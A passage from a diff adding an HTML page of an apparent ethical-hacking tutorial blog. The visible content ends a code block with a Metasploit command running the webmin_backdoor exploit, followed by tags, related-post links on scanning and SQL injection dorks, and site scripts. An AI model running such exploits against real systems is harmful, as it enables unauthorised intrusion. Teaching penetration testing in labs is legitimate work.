+</span></span><span class="line"><span class="cl"><span class="n">msf6</span> <span class="n">exploit</span><span class="p">(</span><span class="n">linux</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">webmin_backdoor</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">run</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>thank you :)</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/information-gathering/">Information-Gathering</a>
+        
+            <a href="/tags/ethical-hacking/">Ethical-Hacking</a>
+        
+            <a href="/tags/pentester-series/">Pentester-SERIES</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under santricyber</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/day-16-port-scanning-with-nmap/">
+        
+        
+            <div class="article-image">
+                <img src="/p/day-16-port-scanning-with-nmap/pentest1.4b23f453d9a029c9a0cb787f3c964d00_hu9e03b6392363072fc6440fea7388e812_32608_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Day 16 Port Scanning With Nmap"
+                        
+                        data-hash="md5-SyP0U9mgKcmgy3h/PJZNAA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Day 16 Port Scanning With Nmap</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/day-14-command-for-dirsearch-and-subfinder/">
+        
+        
+            <div class="article-image">
+                <img src="/p/day-14-command-for-dirsearch-and-subfinder/pentest1.4b23f453d9a029c9a0cb787f3c964d00_hu9e03b6392363072fc6440fea7388e812_32608_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Day 14 Command for Dirsearch and Subfinder"
+                        
+                        data-hash="md5-SyP0U9mgKcmgy3h/PJZNAA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Day 14 Command for Dirsearch and Subfinder</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/day-12-list-of-dork-for-sql-injection/">
+        
+        
+            <div class="article-image">
+                <img src="/p/day-12-list-of-dork-for-sql-injection/pentest1.4b23f453d9a029c9a0cb787f3c964d00_hu9e03b6392363072fc6440fea7388e812_32608_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Day 12 List of Dork for Sql Injection"
+                        
+                        data-hash="md5-SyP0U9mgKcmgy3h/PJZNAA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Day 12 List of Dork for Sql Injection</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/day-11-easy-burpsuite-configuration-with-external-browser/">
+        
+        
+            <div class="article-image">
+                <img src="/p/day-11-easy-burpsuite-configuration-with-external-browser/day11.313bdf02723615e462e093cc7484a606_hucc47313f5906550dc8b19c085d1c6b66_38109_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Day 11 Easy Burpsuite Configuration With External Browser"
+                        
+                        data-hash="md5-MTvfAnI2FeRi4JPMdISmBg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Day 11 Easy Burpsuite Configuration With External Browser</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/day-10-hacking-lab-preparation/">
+        
+        
+            <div class="article-image">
+                <img src="/p/day-10-hacking-lab-preparation/day10.a23c393081b498d87d8259538776197e_hufaaf9b8b9d6be344d060d1c88072efad_30958_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Day 10 Hacking Lab Preparation"
+                        
+                        data-hash="md5-ojw5MIG0mNh9gllTh3YZfg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Day 10 Hacking Lab Preparation</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "santricyber" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2025 santricyber
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.26.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+
+        
+    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KXRL7SV"
+    height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+    
+
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-5756387925386548"
+     crossorigin="anonymous"></script>
+    
+    <ins class="adsbygoogle"
+         style="display:block"
+         data-ad-client="ca-pub-5756387925386548"
+         data-ad-slot="6471855953"
+         data-ad-format="auto"
+         data-full-width-responsive="true"></ins>
+    <script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+    </script>
+
+    
+    <script async custom-element="amp-auto-ads"
+    src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+    </body>
+</html>
